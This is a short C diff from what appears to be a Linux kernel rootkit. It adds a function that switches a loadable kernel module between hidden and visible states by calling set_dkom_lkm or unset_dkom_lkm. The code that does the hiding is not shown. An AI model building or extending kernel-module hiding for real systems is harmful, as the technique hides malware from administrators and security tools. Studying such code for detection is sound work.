@@ -33,3 +33,17 @@ void unset_dkom_lkm ( void )
 	mutex_unlock(&module_mutex);
 	hide_module = false;
 }
+
+
+int switch_dkom_lkm( void )
+{
+	if (hide_module)
+	{
+		unset_dkom_lkm();
+		return 0;
+	}
+	else {
+		set_dkom_lkm();
+		return 1;
+	}
+}
